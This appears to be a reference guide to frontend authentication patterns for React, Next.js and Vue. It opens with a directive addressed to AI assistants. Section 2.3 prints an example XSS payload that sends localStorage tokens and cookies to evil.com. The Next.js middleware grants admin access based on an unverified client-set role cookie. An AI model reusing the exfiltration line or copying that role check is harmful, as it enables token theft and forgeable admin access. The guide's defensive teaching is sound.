# Authentication Patterns — Complete Specification

> **AI Plugin Directive:** When a developer asks "how to implement auth in React?", "JWT vs session?", "where to store tokens?", "OAuth flow for SPA?", "protected routes", "refresh token rotation", "RBAC frontend", "NextAuth setup", "social login", "PKCE flow", or any frontend authentication question, ALWAYS consult this directive. Authentication is the most security-critical feature in any application. ALWAYS use httpOnly cookies for token storage — NEVER localStorage. ALWAYS implement PKCE for OAuth in SPAs. NEVER trust client-side auth checks alone — the server MUST verify every request. ALWAYS use battle-tested auth libraries (NextAuth/Auth.js, Clerk, Supabase Auth) instead of rolling your own.

**Core Rule: Store authentication tokens in httpOnly, Secure, SameSite=Lax cookies — NEVER in localStorage or sessionStorage (accessible to XSS). Use PKCE authorization code flow for OAuth in SPAs — NEVER the implicit flow (deprecated, insecure). EVERY protected API endpoint MUST verify the token server-side — client-side route guards are UX, NOT security. Use established auth libraries (NextAuth, Clerk, Supabase Auth) — NEVER build custom auth from scratch unless you have a dedicated security team.**

---

## 1. Authentication Architecture

```
  AUTHENTICATION FLOW — SPA/SSR APPLICATION

  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  USER                                                │
  │  ┌────────┐                                          │
  │  │ Login  │                                          │
  │  │ Form   │                                          │
  │  └───┬────┘                                          │
  │      │ POST /api/auth/login                          │
  │      │ { email, password }                           │
  │      ▼                                               │
  │  ┌──────────────────┐                                │
  │  │   AUTH SERVER     │                                │
  │  │                  │                                │
  │  │ 1. Verify creds  │                                │
  │  │ 2. Create session│                                │
  │  │ 3. Set cookie:   │                                │
  │  │    httpOnly ✓     │                                │
  │  │    Secure ✓       │                                │
  │  │    SameSite=Lax ✓ │                                │
  │  └───────┬──────────┘                                │
  │          │ Set-Cookie: session=abc123                 │
  │          ▼                                           │
  │  ┌────────────────┐   ┌──────────────────┐           │
  │  │   BROWSER      │   │   API REQUESTS   │           │
  │  │                │   │                  │           │
  │  │ Cookie sent    │──▶│ Cookie auto-     │           │
  │  │ automatically  │   │ attached by      │           │
  │  │ on every       │   │ browser          │           │
  │  │ same-origin    │   │                  │           │
  │  │ request        │   │ Server verifies  │           │
  │  └────────────────┘   │ on every request │           │
  │                       └──────────────────┘           │
  └──────────────────────────────────────────────────────┘
```

---

## 2. Token Storage — Security Comparison

### 2.1 Where to Store Tokens

| Storage | XSS Vulnerable | CSRF Vulnerable | Auto-Sent | Recommended |
|---|---|---|---|---|
| **httpOnly Cookie** | NO (JS cannot read) | YES (mitigate with SameSite) | YES | YES |
| **localStorage** | YES (XSS reads it) | NO | NO (manual header) | NEVER |
| **sessionStorage** | YES (XSS reads it) | NO | NO | NEVER |
| **In-memory variable** | Partial (XSS can't persist) | NO | NO | Only for short-lived tokens |
| **Secure Cookie (not httpOnly)** | YES (JS can read) | YES | YES | NO |

```
  TOKEN STORAGE DECISION

  START
    │
    ├── Can your backend set httpOnly cookies?
    │   └── YES → httpOnly cookie with SameSite=Lax (ALWAYS)
    │
    ├── Third-party API only (no backend)?
    │   └── In-memory variable + silent refresh
    │       (lose token on tab close, refresh via iframe/redirect)
    │
    └── Using a BFF (Backend-for-Frontend)?
        └── BFF stores token server-side, proxies API calls
            Browser only has session cookie to BFF
```

### 2.2 httpOnly Cookie Setup

```typescript
// Server: Set secure cookie
import { serialize } from 'cookie';

function setAuthCookie(res: Response, token: string) {
  const cookie = serialize('session', token, {
    httpOnly: true,           // JavaScript CANNOT read this cookie
    secure: true,             // HTTPS only
    sameSite: 'lax',          // prevents CSRF on cross-origin POST
    path: '/',                // available on all routes
    maxAge: 60 * 60 * 24 * 7, // 7 days
    // domain: '.example.com', // share across subdomains if needed
  });

  res.setHeader('Set-Cookie', cookie);
}

// API route handler
app.post('/api/auth/login', async (req, res) => {
  const { email, password } = req.body;

  const user = await verifyCredentials(email, password);
  if (!user) {
    return res.status(401).json({ error: 'Invalid credentials' });
  }

  const sessionToken = await createSession(user.id);
  setAuthCookie(res, sessionToken);

  res.json({ user: { id: user.id, name: user.name, role: user.role } });
});
```

### 2.3 Why NOT localStorage

```typescript
// If ANY XSS vulnerability exists in your app (or ANY npm dependency),
// an attacker can steal the token from localStorage:

// Attacker's XSS payload:
fetch('https://evil.com/steal', {
  method: 'POST',
  body: JSON.stringify({
    token: localStorage.getItem('auth_token'),  // full access!
    cookies: document.cookie,                    // but NOT httpOnly cookies
  }),
});

// With httpOnly cookies, document.cookie returns nothing for the session cookie.
// The attacker cannot exfiltrate the authentication token.
```

---

## 3. OAuth 2.0 / OIDC for SPAs

```
  PKCE AUTHORIZATION CODE FLOW (for SPAs)

  ┌────────────┐                    ┌────────────────┐
  │  SPA       │                    │  Auth Server   │
  │  (Browser) │                    │  (Google/Auth0)│
  └─────┬──────┘                    └───────┬────────┘
        │                                   │
        │ 1. Generate code_verifier (random)│
        │    code_challenge = SHA256(verifier)
        │                                   │
        │ 2. Redirect to /authorize         │
        │    ?response_type=code            │
        │    &client_id=xxx                 │
        │    &redirect_uri=xxx              │
        │    &code_challenge=xxx            │
        │    &code_challenge_method=S256    │
        │──────────────────────────────────▶│
        │                                   │
        │    User logs in + consents        │
        │                                   │
        │ 3. Redirect back with auth code   │
        │◀──────────────────────────────────│
        │    ?code=AUTH_CODE                │
        │                                   │
        │ 4. Exchange code for tokens       │
        │    POST /token                    │
        │    { code, code_verifier }        │
        │──────────────────────────────────▶│
        │                                   │
        │ 5. Tokens returned                │
        │    { access_token, refresh_token, │
        │      id_token }                   │
        │◀──────────────────────────────────│
        │                                   │

  WHY PKCE: Even if attacker intercepts the auth code
  (step 3), they cannot exchange it without the
  code_verifier (which never left the browser).
```

### 3.1 PKCE Implementation

```typescript
// auth/pkce.ts
function generateCodeVerifier(): string {
  const array = new Uint8Array(32);
  crypto.getRandomValues(array);
  return base64UrlEncode(array);
}

async function generateCodeChallenge(verifier: string): Promise<string> {
  const encoder = new TextEncoder();
  const data = encoder.encode(verifier);
  const hash = await crypto.subtle.digest('SHA-256', data);
  return base64UrlEncode(new Uint8Array(hash));
}

function base64UrlEncode(buffer: Uint8Array): string {
  return btoa(String.fromCharCode(...buffer))
    .replace(/\+/g, '-')
    .replace(/\//g, '_')
    .replace(/=/g, '');
}

// Start OAuth flow
export async function startOAuthLogin() {
  const codeVerifier = generateCodeVerifier();
  const codeChallenge = await generateCodeChallenge(codeVerifier);

  // Store verifier for callback (sessionStorage is OK here — short-lived)
  sessionStorage.setItem('pkce_verifier', codeVerifier);

  const params = new URLSearchParams({
    response_type: 'code',
    client_id: process.env.OAUTH_CLIENT_ID!,
    redirect_uri: `${window.location.origin}/auth/callback`,
    scope: 'openid profile email',
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
    state: crypto.randomUUID(),        // CSRF protection
  });

  window.location.href = `https://auth.example.com/authorize?${params}`;
}
```

```typescript
// auth/callback.ts — handle OAuth callback
export async function handleOAuthCallback() {
  const params = new URLSearchParams(window.location.search);
  const code = params.get('code');
  const codeVerifier = sessionStorage.getItem('pkce_verifier');

  if (!code || !codeVerifier) {
    throw new Error('Invalid OAuth callback');
  }

  // Exchange code for tokens via YOUR backend (not directly to auth server)
  const response = await fetch('/api/auth/oauth/callback', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ code, codeVerifier }),
  });

  sessionStorage.removeItem('pkce_verifier');

  if (!response.ok) {
    throw new Error('Token exchange failed');
  }

  // Backend sets httpOnly cookie — no token in JS
  return response.json();
}
```

---

## 4. Protected Routes

### 4.1 React Router Guards

```tsx
// ProtectedRoute.tsx
import { Navigate, useLocation } from 'react-router-dom';
import { useAuth } from './auth-context';

interface ProtectedRouteProps {
  children: React.ReactNode;
  requiredRole?: string;
}

export function ProtectedRoute({ children, requiredRole }: ProtectedRouteProps) {
  const { user, isLoading } = useAuth();
  const location = useLocation();

  if (isLoading) {
    return <div>Loading...</div>;       // or skeleton
  }

  if (!user) {
    // Save attempted URL for post-login redirect
    return <Navigate to="/login" state={{ from: location }} replace />;
  }

  if (requiredRole && user.role !== requiredRole) {
    return <Navigate to="/unauthorized" replace />;
  }

  return <>{children}</>;
}

// Usage
<Routes>
  <Route path="/login" element={<LoginPage />} />
  <Route
    path="/dashboard"
    element={
      <ProtectedRoute>
        <DashboardPage />
      </ProtectedRoute>
    }
  />
  <Route
    path="/admin"
    element={
      <ProtectedRoute requiredRole="admin">
        <AdminPage />
      </ProtectedRoute>
    }
  />
</Routes>
```

### 4.2 Next.js Middleware

```typescript
// middleware.ts (Next.js)
import { NextRequest, NextResponse } from 'next/server';

const publicPaths = ['/login', '/register', '/forgot-password', '/api/auth'];
const adminPaths = ['/admin', '/api/admin'];

export function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // Allow public paths
  if (publicPaths.some(path => pathname.startsWith(path))) {
    return NextResponse.next();
  }

  // Check session cookie
  const sessionToken = request.cookies.get('session')?.value;

  if (!sessionToken) {
    const loginUrl = new URL('/login', request.url);
    loginUrl.searchParams.set('redirect', pathname);
    return NextResponse.redirect(loginUrl);
  }

  // For admin paths, verify role (decode JWT or check session)
  if (adminPaths.some(path => pathname.startsWith(path))) {
    // In production, verify JWT claims or check session store
    const userRole = request.cookies.get('user_role')?.value;
    if (userRole !== 'admin') {
      return NextResponse.redirect(new URL('/unauthorized', request.url));
    }
  }

  return NextResponse.next();
}

export const config = {
  matcher: ['/((?!_next/static|_next/image|favicon.ico).*)'],
};
```

### 4.3 Vue Router Guards

```typescript
// router/index.ts (Vue)
import { createRouter, createWebHistory } from 'vue-router';
import { useAuthStore } from '@/stores/auth';

const router = createRouter({
  history: createWebHistory(),
  routes: [
    { path: '/login', component: LoginPage, meta: { public: true } },
    { path: '/dashboard', component: DashboardPage, meta: { requiresAuth: true } },
    { path: '/admin', component: AdminPage, meta: { requiresAuth: true, role: 'admin' } },
  ],
});

router.beforeEach(async (to) => {
  const auth = useAuthStore();

  if (to.meta.public) return true;

  if (to.meta.requiresAuth && !auth.isAuthenticated) {
    return { path: '/login', query: { redirect: to.fullPath } };
  }

  if (to.meta.role && auth.user?.role !== to.meta.role) {
    return { path: '/unauthorized' };
  }

  return true;
});
```

---

## 5. Refresh Token Rotation

```
  REFRESH TOKEN ROTATION FLOW

  ┌──────────────────────────────────────────────────────┐
  │                                                      │
  │  Access Token:  Short-lived (15 min)                 │
  │  Refresh Token: Long-lived (7 days), rotated on use  │
  │                                                      │
  │  Timeline:                                           │
  │  ────────────────────────────────────────────────────│
  │  0m         15m        30m        45m                │
  │  │ access   │ expired  │ access   │ expired          │
  │  │ token #1 │          │ token #2 │                  │
  │  │          │          │          │                  │
  │  │          │ refresh  │          │ refresh          │
  │  │          │ token #1 │          │ token #2         │
  │  │          │ → get    │          │ → get            │
  │  │          │   token  │          │   token          │
  │  │          │   #2     │          │   #3             │
  │  │          │ + NEW    │          │ + NEW            │
  │  │          │   refresh│          │   refresh        │
  │  │          │   token  │          │   token          │
  │  │          │   #2     │          │   #3             │
  │                                                      │
  │  ROTATION: Each refresh issues a NEW refresh token.  │
  │  Old refresh token is INVALIDATED.                   │
  │  If old token is used → ALL sessions revoked         │
  │  (indicates token theft).                            │
  └──────────────────────────────────────────────────────┘
```

```typescript
// Silent refresh — refresh access token before it expires
let refreshTimer: NodeJS.Timeout;

async function setupSilentRefresh(expiresIn: number) {
  // Refresh 60 seconds before expiry
  const refreshTime = (expiresIn - 60) * 1000;

  refreshTimer = setTimeout(async () => {
    try {
      const response = await fetch('/api/auth/refresh', {
        method: 'POST',
        credentials: 'include',         // send httpOnly cookie
      });

      if (response.ok) {
        const { expiresIn: newExpiry } = await response.json();
        setupSilentRefresh(newExpiry);   // schedule next refresh
      } else {
        // Refresh failed — redirect to login
        window.location.href = '/login';
      }
    } catch {
      // Network error — retry once
      setTimeout(() => setupSilentRefresh(60), 5000);
    }
  }, refreshTime);
}

// On logout, clear timer
function logout() {
  clearTimeout(refreshTimer);
  fetch('/api/auth/logout', { method: 'POST', credentials: 'include' });
  window.location.href = '/login';
}
```

---

## 6. Role-Based Access Control (RBAC)

```tsx
// auth/rbac.ts
type Role = 'admin' | 'editor' | 'viewer';

type Permission =
  | 'read:posts'
  | 'write:posts'
  | 'delete:posts'
  | 'manage:users'
  | 'view:analytics'
  | 'manage:settings';

const rolePermissions: Record<Role, Permission[]> = {
  admin: ['read:posts', 'write:posts', 'delete:posts', 'manage:users', 'view:analytics', 'manage:settings'],
  editor: ['read:posts', 'write:posts', 'view:analytics'],
  viewer: ['read:posts'],
};

export function hasPermission(role: Role, permission: Permission): boolean {
  return rolePermissions[role]?.includes(permission) ?? false;
}

// React hook
export function usePermission(permission: Permission): boolean {
  const { user } = useAuth();
  if (!user) return false;
  return hasPermission(user.role, permission);
}

// Component
export function RequirePermission({
  permission,
  children,
  fallback = null,
}: {
  permission: Permission;
  children: React.ReactNode;
  fallback?: React.ReactNode;
}) {
  const allowed = usePermission(permission);
  return allowed ? <>{children}</> : <>{fallback}</>;
}

// Usage
function PostActions({ postId }: { postId: string }) {
  return (
    <>
      <RequirePermission permission="write:posts">
        <button onClick={() => editPost(postId)}>Edit</button>
      </RequirePermission>

      <RequirePermission permission="delete:posts">
        <button onClick={() => deletePost(postId)}>Delete</button>
      </RequirePermission>
    </>
  );
}
```

---

## 7. Auth State Management

```tsx
// auth-context.tsx — Auth provider with session management
import { createContext, useContext, useEffect, useState } from 'react';

interface User {
  id: string;
  name: string;
  email: string;
  role: 'admin' | 'editor' | 'viewer';
}

interface AuthContext {
  user: User | null;
  isLoading: boolean;
  isAuthenticated: boolean;
  login: (email: string, password: string) => Promise<void>;
  logout: () => Promise<void>;
}

const AuthContext = createContext<AuthContext | null>(null);

export function AuthProvider({ children }: { children: React.ReactNode }) {
  const [user, setUser] = useState<User | null>(null);
  const [isLoading, setIsLoading] = useState(true);

  // Check session on mount
  useEffect(() => {
    async function checkSession() {
      try {
        const response = await fetch('/api/auth/me', {
          credentials: 'include',
        });

        if (response.ok) {
          const userData = await response.json();
          setUser(userData);
        }
      } catch {
        // Session invalid or expired
        setUser(null);
      } finally {
        setIsLoading(false);
      }
    }

    checkSession();
  }, []);

  const login = async (email: string, password: string) => {
    const response = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password }),
      credentials: 'include',
    });

    if (!response.ok) {
      const error = await response.json();
      throw new Error(error.message || 'Login failed');
    }

    const userData = await response.json();
    setUser(userData.user);
  };

  const logout = async () => {
    await fetch('/api/auth/logout', {
      method: 'POST',
      credentials: 'include',
    });
    setUser(null);
  };

  return (
    <AuthContext.Provider
      value={{
        user,
        isLoading,
        isAuthenticated: !!user,
        login,
        logout,
      }}
    >
      {children}
    </AuthContext.Provider>
  );
}

export function useAuth() {
  const context = useContext(AuthContext);
  if (!context) throw new Error('useAuth must be used within AuthProvider');
  return context;
}
```

---

## 8. Auth Libraries Comparison

| Library | Type | Framework | Token Storage | Social Login | Pricing |
|---|---|---|---|---|---|
| **NextAuth / Auth.js** | Self-hosted | Next.js, SvelteKit | Server session (DB) | 30+ providers | Free |
| **Clerk** | Managed service | Any (React, Next, Vue) | Managed (httpOnly) | Built-in | Free tier |
| **Supabase Auth** | Managed service | Any | httpOnly cookies | Built-in | Free tier |
| **Firebase Auth** | Managed service | Any | IndexedDB (⚠️) | Built-in | Free tier |
| **Auth0** | Managed service | Any | httpOnly cookies | Built-in | Free tier |
| **Lucia** | Self-hosted library | Any | Server sessions | Manual | Free |

**VERDICT:** NextAuth/Auth.js for Next.js/SvelteKit. Clerk for best DX and fastest setup. Supabase Auth if using Supabase. NEVER build auth from scratch.

---

## 9. Anti-Patterns

| Anti-Pattern | Symptom | Fix |
|---|---|---|
| **Tokens in localStorage** | XSS attack steals all auth tokens | Use httpOnly cookies — JS cannot read them |
| **Implicit grant flow** | Access token in URL fragment — exposed in browser history, referrer headers | Use PKCE authorization code flow |
| **No token refresh** | User gets logged out every 15 minutes (access token expiry) | Implement silent refresh with rotating refresh tokens |
| **Client-only auth checks** | Protected route shows content, then redirects after API 401 | Server middleware (Next.js middleware, Express middleware) checks FIRST |
| **Shared secret in frontend** | `client_secret` in browser JavaScript — visible in DevTools | NEVER include client_secret in SPA — use PKCE (no secret needed) |
| **No CSRF protection** | Cookie-based auth vulnerable to cross-site form submissions | `SameSite=Lax` on cookies + CSRF token for state-changing requests |
| **Rolling your own auth** | Custom JWT signing, password hashing, session management | Use NextAuth, Clerk, or Supabase Auth — battle-tested security |
| **Storing role in JWT without verification** | Frontend reads role from JWT — attacker modifies JWT payload | Server MUST verify JWT signature + check role from database |
| **No logout on all devices** | User changes password but old sessions on other devices still work | Invalidate all sessions on password change (session store) |
| **No rate limiting on login** | Attacker brute-forces passwords with unlimited attempts | Rate limit login endpoint: 5 attempts per IP per minute |

---

## 10. Enforcement Checklist

### Token Storage
- [ ] Auth tokens stored in httpOnly, Secure, SameSite=Lax cookies
- [ ] NO tokens in localStorage, sessionStorage, or JS variables (long-term)
- [ ] Cookie Max-Age set appropriately (7-30 days for refresh, 15m for access)
- [ ] Cookie path restricted to minimize exposure

### OAuth / Social Login
- [ ] PKCE authorization code flow used for all OAuth (not implicit grant)
- [ ] State parameter used for CSRF protection in OAuth
- [ ] Token exchange happens on server (not in browser)
- [ ] client_secret NEVER present in frontend code

### Session Management
- [ ] Silent refresh implemented before access token expiry
- [ ] Refresh token rotation enabled (new refresh token on each use)
- [ ] All sessions invalidated on password change
- [ ] Logout clears cookie and invalidates server session

### Route Protection
- [ ] Server middleware protects ALL sensitive routes (not just client guards)
- [ ] Client guards show loading state while checking auth
- [ ] Unauthorized redirect preserves intended URL for post-login redirect
- [ ] RBAC permissions checked server-side for every sensitive action

### Security
- [ ] Login endpoint rate-limited (5 attempts per IP per minute)
- [ ] Password hashed with bcrypt/argon2 (NEVER MD5/SHA-1)
- [ ] HTTPS enforced (Secure cookie flag + HSTS header)
- [ ] CSRF protection for state-changing requests
